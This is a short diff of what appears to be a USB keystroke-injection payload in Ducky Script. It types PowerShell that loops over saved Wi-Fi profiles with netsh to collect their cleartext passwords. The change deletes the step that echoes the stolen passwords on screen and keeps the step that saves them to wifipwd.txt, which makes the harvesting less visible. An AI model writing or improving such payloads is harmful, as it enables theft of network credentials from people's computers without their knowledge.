@@ -15,10 +15,6 @@ STRING $ClearWifiPwd=Foreach($SSID in $SSIDList){ echo $SSID ; netsh wlan show p
 DELAY 500
 ENTER
 DELAY 500
-STRING echo $ClearWifiPwd
-DELAY 500
-ENTER
-DELAY 500
 STRING echo $ClearWifiPwd | Out-File -FilePath ./wifipwd.txt
 DELAY 500
 ENTER
